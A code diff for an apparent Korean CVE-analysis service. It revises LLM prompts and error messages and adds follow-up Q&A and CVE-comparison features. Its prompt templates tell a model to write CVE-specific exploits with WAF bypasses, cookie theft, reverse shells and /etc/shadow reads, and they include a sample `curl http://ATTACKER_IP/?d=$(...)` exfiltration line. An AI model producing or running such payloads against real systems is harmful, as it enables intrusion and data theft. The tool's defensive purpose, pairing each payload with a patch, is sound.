@@ -47,59 +47,23 @@ _SYSTEM_PROMPT = (
 )
 
 _USER_TEMPLATE = (
-    "다음 CVE를 분석해 주세요. 실무자가 이 결과만 보고도 공격 재현과 패치 구현이 가능해야 합니다.\n\n"
+    "다음 CVE 를 분석해 주세요. 실무자가 결과만으로 PoC 재현 + 패치 구현이 가능해야 합니다.\n\n"
     "CVE ID: {cve_id}\n"
     "제목: {title}\n"
     "설명:\n{description}\n\n"
-    "JSON 필드 작성 규칙입니다.\n\n"
-    "attack_method (문자열, 한 단락):\n"
-    "  다음 4가지를 순서대로 포함하세요.\n"
-    "  (1) 취약한 컴포넌트와 버전 범위, 기본 설정에서 노출되는지 여부\n"
-    "  (2) 공격 전제조건 — 인증 필요 여부, 네트워크 위치, 활성화돼야 하는 기능/설정\n"
-    "  (3) 실제 트리거 경로 — 어떤 엔드포인트·파라미터·파일 형식·함수 호출이 어떤 내부 로직의 어떤 결함을 건드리는지\n"
-    "  (4) 성공 시 영향 — 획득 권한과 후속 피벗 가능성\n"
-    "  '악성 페이로드 전송', '취약점을 악용하여' 같은 추상적 표현 금지. 취약한 코드 경로가 무엇을 잘못 처리하는지까지 설명.\n\n"
-    "payload_examples (문자열 배열, 2~5개 항목 — 같은 CVE 의 서로 다른 변형/우회/체인):\n"
-    "  중요: 범용·교과서 예시 금지. 이 CVE 에만 해당하는 구체적 exploit 만 작성.\n"
-    "  각 항목은 독립적으로 실행/검증 가능한 PoC 한 덩어리입니다 — 여러 단계 시나리오라면\n"
-    "  각 단계를 별도 페이로드로 쪼개지 말고 한 항목 안에 줄바꿈으로 묶으세요.\n"
-    "  여러 항목이 의미를 갖는 경우 (모두 작성하지는 말고 해당하는 것만):\n"
-    "    - 기본 페이로드 + WAF/필터 우회 변형 (인코딩·대소문자·중첩·null byte 등)\n"
-    "    - 다른 진입점 (파라미터/헤더/POST body/path)\n"
-    "    - blind 변형 (응답 본문 echo 가 없을 때 time/canary/외부 fetch 활용)\n"
-    "    - exfil 단계까지 이어지는 체인 (XSS → 쿠키 탈취 fetch, SQLi → UNION 으로 hash 추출 등)\n"
-    "  반드시 지킬 것:\n"
-    "    1) CVE 설명·제목에 등장한 실제 엔드포인트·파라미터·함수명·파일 경로·헤더명을 그대로 사용\n"
-    "    2) 단순 존재 증명(alert(1), 그냥 ' OR 1=1-- 같은 1줄 PoC) 금지 — 기본 필터·처리 로직을 실제로 뚫는 형태\n"
-    "    3) 실제 영향을 회수하는 메커니즘 포함:\n"
-    "       - XSS → document.cookie·localStorage·CSRF 토큰을 ATTACKER_IP 로 fetch/이미지 비콘 전송\n"
-    "       - SQLi → UNION 또는 boolean/time-based 기반 DB 버전·사용자·해시 추출 쿼리\n"
-    "       - 명령 인젝션 → `curl http://ATTACKER_IP/?d=$(명령 | base64)` 또는 리버스 셸\n"
-    "       - 경로 순회 → /etc/shadow, /proc/self/environ, 시크릿 등 구체적 민감 파일까지\n"
-    "       - SSRF → 클라우드 메타데이터(AWS 169.254.169.254, GCP metadata.google.internal) 또는 내부 관리 엔드포인트\n"
-    "       - 역직렬화/템플릿 인젝션 → 실제로 원격 명령까지 이어지는 gadget chain 또는 템플릿 payload\n"
-    "       - 인증 없이 HTTP 트리거 RCE → curl 또는 HTTP 원문 한 세트로 명령 실행 + 결과 회수까지\n"
-    "    4) payload 내 '# 핵심: ...' 주석으로 '이 토큰·인코딩·헤더가 어떤 필터/검사를 왜 우회하는지' 최소 1회 지적\n"
-    "  유형별 본체 형식:\n"
-    "    - XSS/HTML 인젝션 → 주입될 HTML/JS 본체만 (curl 래퍼 금지)\n"
-    "    - SQL 인젝션·명령 인젝션·경로 순회·템플릿 인젝션 → 주입되는 문자열만\n"
-    "    - SSRF → URL 한 줄\n"
-    "    - HTTP 트리거 RCE/인증우회 → curl 또는 HTTP 원문, 여러 줄\n"
-    "    - 메모리 손상/바이너리 → 최소한의 python PoC\n"
-    "  주석 규칙: 첫 줄 '# 용도: ...', 마지막 줄 '# 확인 포인트: ...' (외부 수신 로그/응답 문자열/소요 시간 등 성공 판별 기준).\n"
-    "  순수 문자열 형태 (SQL/path/URL 등 단일 line) 는 페이로드 본체만 작성.\n"
-    "  여러 줄은 JSON 문자열 내 실제 개행(\\n) 으로 구분, 한 줄로 압축 금지.\n"
-    "  ATTACKER_IP, TARGET_HOST, SESSION_COOKIE 같은 대문자 플레이스홀더만 사용 (실제 IP·도메인 하드코딩 금지).\n\n"
-    "mitigations (문자열 배열, 3~6개 항목, 우선순위 높은 순) — 위 페이로드를 막는 *패치 항목*:\n"
-    "  매우 중요: 각 항목은 위 payload_examples 가 어떻게 실패하는지 *구체적으로* 설명해야 합니다 ('이 페이로드의 OO 부분이 OO 검사에 걸려 차단됨' 식).\n"
-    "  형식: '[분류] 적용 위치·방법 — 이 패치 적용 시 위 payload 의 어느 부분이 왜 실패하는지'\n"
-    "  분류: 코드패치 / 설정변경 / 입력검증 / WAF·네트워크 / 버전업그레이드\n"
-    "  - 코드패치: 수정 전/후 코드 스니펫 또는 함수명·파일 위치 수준의 구체성\n"
-    "  - 설정변경: 어떤 설정 키를 어떤 값으로 (`feature.xxx=true` 같이 명시적)\n"
-    "  - 입력검증: 어떤 정규식·화이트리스트·정규화가 payload 의 어느 토큰을 거르는지\n"
-    "  - WAF·네트워크: ModSecurity 규칙 (`SecRule ARGS \"@rx ...\"`) 또는 nginx/HAProxy 룰 예시. payload 의 어느 문자열을 매칭하는지 명시\n"
-    "  - 버전업그레이드: 수정 버전 번호 + 그 버전에서 payload 의 트리거 경로가 어떻게 변경됐는지\n"
-    "  payload 와 무관한 일반 조언 (로그 모니터링, 최소 권한 등) 금지."
+    "**오직 다음 JSON 만 반환하세요. 마크다운 코드 펜스, 설명, 그 외 텍스트 금지.**\n\n"
+    "attack_method (문자열, 한 단락): 취약 컴포넌트·버전 → 전제조건 → 실제 트리거 경로(엔드포인트·파라미터·함수) → 성공 시 영향. "
+    "추상 표현 금지, 코드 경로가 무엇을 잘못 처리하는지까지.\n\n"
+    "payload_examples (배열, 2-3개): 이 CVE 한정 구체 exploit. 범용 예시 금지. "
+    "각 항목 첫 줄 `# 용도: ...`, 마지막 줄 `# 확인 포인트: ...`. "
+    "CVE 설명에 등장한 실제 엔드포인트·파라미터·함수명을 그대로 사용. "
+    "실제 영향 회수 메커니즘 포함 (XSS → 쿠키 fetch, SQLi → UNION 추출, 명령 인젝션 → 리버스셸/curl, "
+    "경로순회 → /etc/shadow 등 민감 파일, SSRF → 메타데이터 엔드포인트, 역직렬화 → gadget chain). "
+    "ATTACKER_IP·TARGET_HOST·SESSION_COOKIE 같은 대문자 플레이스홀더 사용.\n\n"
+    "mitigations (배열, 3-4개): 각 항목은 위 페이로드의 어느 부분이 어떻게 차단되는지 1:1 매핑. "
+    "형식 `[분류] 위치 — 차단 메커니즘`. 분류: 코드패치 / 설정변경 / 입력검증 / WAF·네트워크 / 버전업그레이드. "
+    "코드패치는 수정 전/후 스니펫, WAF는 ModSecurity/nginx 룰, 버전업그레이드는 수정 버전 번호. "
+    "payload 와 무관한 일반 조언(로그 모니터링·최소 권한 등) 금지."
 )
 
 _JSON_SCHEMA = {
@@ -164,7 +128,7 @@ async def _load_active_credential(db: AsyncSession) -> AiCredential:
     ).scalar_one_or_none()
     if settings_row is None or settings_row.active_credential_id is None:
         raise AiAnalyzerNotConfigured(
-            "활성화된 AI 키가 없습니다. 설정 페이지에서 키를 등록하고 사용할 키를 선택하세요.",
+            "활성화된 AI 인증이 없어요. 설정 페이지에서 키를 등록하고 사용할 항목을 선택해 주세요.",
         )
     cred = (
         await db.execute(
@@ -173,17 +137,17 @@ async def _load_active_credential(db: AsyncSession) -> AiCredential:
     ).scalar_one_or_none()
     if cred is None:
         raise AiAnalyzerNotConfigured(
-            "선택한 AI 키를 찾을 수 없습니다. 설정 페이지에서 다시 선택해주세요.",
+            "선택한 AI 인증을 찾을 수 없어요. 설정 페이지에서 다시 활성화해 주세요.",
         )
     # claude_cli uses the host's Claude Code login, not an API key.
     if (cred.provider or "").lower() != "claude_cli" and not cred.api_key:
         raise AiAnalyzerNotConfigured(
-            "선택한 자격 증명에 API 키가 비어 있습니다. 설정 페이지에서 확인해주세요.",
+            "선택한 인증의 API 키가 비어 있어요. 설정 페이지에서 다시 등록해 주세요.",
         )
     if not cred.provider:
-        raise AiAnalyzerNotConfigured("AI 제공자가 설정되지 않았습니다.")
+        raise AiAnalyzerNotConfigured("AI 제공자가 지정되지 않았어요.")
     if not cred.model:
-        raise AiAnalyzerNotConfigured("AI 모델이 설정되지 않았습니다.")
+        raise AiAnalyzerNotConfigured("AI 모델이 지정되지 않았어요.")
     return cred
 
 
@@ -461,6 +425,11 @@ async def _call_claude_cli_text(
     try:
         proc = await asyncio.create_subprocess_exec(
             *args,
+            # CRITICAL: close stdin explicitly. Without this the CLI
+            # waits 3s for stdin data before proceeding ("Warning: no
+            # stdin data received in 3s..."), adding ~3s to every call
+            # for no benefit — we always pass the full prompt via -p.
+            stdin=asyncio.subprocess.DEVNULL,
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE,
             env=env,
@@ -485,9 +454,9 @@ async def _call_claude_cli_text(
         raise HTTPException(
             status_code=504,
             detail=(
-                f"Claude CLI 가 {cli_timeout}초 안에 응답하지 않았습니다. "
-                "토큰 갱신이 막혔거나 Anthropic 측 지연일 수 있어요 — "
-                "설정 → Claude 연동에서 \"다시 로그인\" 후 재시도하면 대부분 해결됩니다."
+                f"Claude CLI 가 {cli_timeout}초 안에 응답하지 않았어요. "
+                "토큰 갱신이 막혔거나 Anthropic 측 지연일 가능성이 있습니다 — "
+                "설정 → Claude 연동에서 '다시 로그인' 후 재시도해 주세요."
             ),
         ) from e
     stdout_text = stdout_bytes.decode("utf-8", errors="replace").strip()
@@ -716,3 +685,157 @@ async def analyze_vulnerability(db: AsyncSession, vuln: Vulnerability) -> AiAnal
     )
     raw = await call_llm(db, _SYSTEM_PROMPT, user_prompt, force_json=True)
     return _parse_payload(raw)
+
+
+# ─────────────── Follow-up question (free-form) ──────────────────────
+
+_FOLLOWUP_SYSTEM = (
+    "당신은 침투 테스트와 취약점 연구 경험이 풍부한 보안 엔지니어입니다. "
+    "이전 분석 결과와 사용자가 지금 던지는 추가 질문에 답합니다. "
+    "답변은 한국어(존댓말)이며 마크다운을 사용합니다. "
+    "추가 사실은 '추정:' 접두사로 명시하고, 코드/PoC 는 ```language 코드블록으로 감쌉니다. "
+    "JSON 으로 답하지 말고 사람이 읽기 쉬운 본문으로 작성하세요."
+)
+
+
+def _format_prior_analysis(prior: "AiAnalysis | None") -> str:
+    if prior is None:
+        return "(이전 분석 결과 없음 — 사용자가 질문만 던졌습니다.)"
+    lines = [
+        f"### 공격 기법\n{prior.attack_method}",
+        "### 페이로드",
+    ]
+    for i, p in enumerate(prior.payload_examples, 1):
+        lines.append(f"  {i}. ```\n{p}\n```")
+    lines.append("### 대응 항목")
+    for i, m in enumerate(prior.mitigations, 1):
+        lines.append(f"  {i}. {m}")
+    return "\n\n".join(lines)
+
+
+async def answer_followup_question(
+    db: AsyncSession,
+    vuln: Vulnerability,
+    prior: "AiAnalysis | None",
+    history: list[tuple[str, str]],  # [(question, answer), ...]
+    question: str,
+) -> str:
+    """Free-form Q&A on top of an existing CVE analysis.
+
+    The model gets the prior structured analysis as a memo + any earlier
+    Q&A turns so follow-ups can refer to "that payload" or "the second
+    mitigation" without the user having to copy-paste.
+    """
+    parts: list[str] = [
+        f"# CVE 컨텍스트\n\nCVE ID: {vuln.cve_id}\n제목: {vuln.title}\n\n## 원문 설명\n{vuln.description}",
+        f"# 사전 분석 메모\n\n{_format_prior_analysis(prior)}",
+    ]
+    if history:
+        parts.append("# 지금까지의 Q&A")
+        for i, (q, a) in enumerate(history, 1):
+            parts.append(f"## 질문 {i}\n{q}\n\n## 답변 {i}\n{a}")
+    parts.append(f"# 새 질문\n\n{question}\n\n# 답변")
+    user_prompt = "\n\n".join(parts)
+    return (await call_llm(db, _FOLLOWUP_SYSTEM, user_prompt, force_json=False)).strip()
+
+
+# ─────────────── Multi-CVE pattern comparison (JSON) ─────────────────
+
+_COMPARE_SYSTEM = (
+    "당신은 침투 테스트와 취약점 연구 경험이 풍부한 보안 엔지니어입니다. "
+    "여러 CVE 를 받아 공통 공격 패턴·차이점·통합 완화 전략을 비교 분석합니다. "
+    "모든 답변은 한국어(존댓말)이며, 반드시 지정된 JSON 스키마만 반환합니다."
+)
+
+_COMPARE_USER_HEADER = (
+    "다음 CVE 들을 비교 분석해 주세요. 보안 운영자가 *한 번의 패치/통제로 여러 건을 동시에* "
+    "막을 수 있는 공통 약점을 찾는 게 목적입니다.\n\n"
+    "JSON 필드 작성 규칙입니다.\n\n"
+    "summary (문자열, 한 단락): 이 묶음을 관통하는 핵심 약점/구조적 원인을 한 줄로.\n"
+    "common_pattern (문자열, 한 단락): 공통된 공격 흐름·취약 코드 패턴·진입점.\n"
+    "differences (문자열 배열, 2~5개): CVE 간 *실제* 차이 — 트리거 조건, 영향 범위, 우회 난이도 등.\n"
+    "shared_mitigations (문자열 배열, 2~5개): 묶음 전체를 막는 통제·패치·아키텍처 조치. 일반 조언 금지.\n"
+    "per_cve_notes (객체 배열): 각 CVE 별 {cve_id, note} 한 줄 메모 — 이 묶음 안에서의 위치/특이점.\n\n"
+)
+
+
+_COMPARE_SCHEMA = {
+    "type": "object",
+    "additionalProperties": False,
+    "required": ["summary", "common_pattern", "differences", "shared_mitigations", "per_cve_notes"],
+    "properties": {
+        "summary": {"type": "string"},
+        "common_pattern": {"type": "string"},
+        "differences": {"type": "array", "items": {"type": "string"}, "minItems": 1},
+        "shared_mitigations": {"type": "array", "items": {"type": "string"}, "minItems": 1},
+        "per_cve_notes": {
+            "type": "array",
+            "items": {
+                "type": "object",
+                "additionalProperties": False,
+                "required": ["cve_id", "note"],
+                "properties": {"cve_id": {"type": "string"}, "note": {"type": "string"}},
+            },
+        },
+    },
+}
+
+
+@dataclass
+class CompareResult:
+    summary: str
+    common_pattern: str
+    differences: list[str]
+    shared_mitigations: list[str]
+    per_cve_notes: list[dict]  # [{cve_id, note}]
+
+
+async def compare_vulnerabilities(
+    db: AsyncSession, vulns: list[Vulnerability]
+) -> CompareResult:
+    """Cross-CVE pattern analysis. 2-5 vulns per call (LLM context limit)."""
+    if len(vulns) < 2:
+        raise HTTPException(status_code=400, detail="비교 분석은 최소 2건의 CVE 가 필요합니다.")
+    if len(vulns) > 5:
+        raise HTTPException(status_code=400, detail="한 번에 비교할 수 있는 CVE 는 최대 5건입니다.")
+
+    rows: list[str] = []
+    for v in vulns:
+        rows.append(
+            f"## {v.cve_id}\n제목: {v.title}\n설명:\n{v.description}"
+        )
+    user_prompt = _COMPARE_USER_HEADER + "\n\n".join(rows)
+    raw = await call_llm(db, _COMPARE_SYSTEM, user_prompt, force_json=True)
+
+    try:
+        data = json.loads(raw)
+    except json.JSONDecodeError as e:
+        # Recover loose JSON from chatty models: take whatever sits between
+        # the first { and the matching last }.
+        start = raw.find("{")
+        end = raw.rfind("}")
+        if start != -1 and end != -1 and end > start:
+            try:
+                data = json.loads(raw[start : end + 1])
+            except json.JSONDecodeError:
+                raise HTTPException(
+                    status_code=502,
+                    detail=f"AI 응답 파싱 실패: {e}",
+                ) from e
+        else:
+            raise HTTPException(
+                status_code=502,
+                detail=f"AI 응답 파싱 실패: {e}",
+            ) from e
+
+    return CompareResult(
+        summary=str(data.get("summary", "")).strip(),
+        common_pattern=str(data.get("common_pattern", "")).strip(),
+        differences=[str(x).strip() for x in (data.get("differences") or [])],
+        shared_mitigations=[str(x).strip() for x in (data.get("shared_mitigations") or [])],
+        per_cve_notes=[
+            {"cve_id": str(n.get("cve_id", "")), "note": str(n.get("note", ""))}
+            for n in (data.get("per_cve_notes") or [])
+            if isinstance(n, dict)
+        ],
+    )
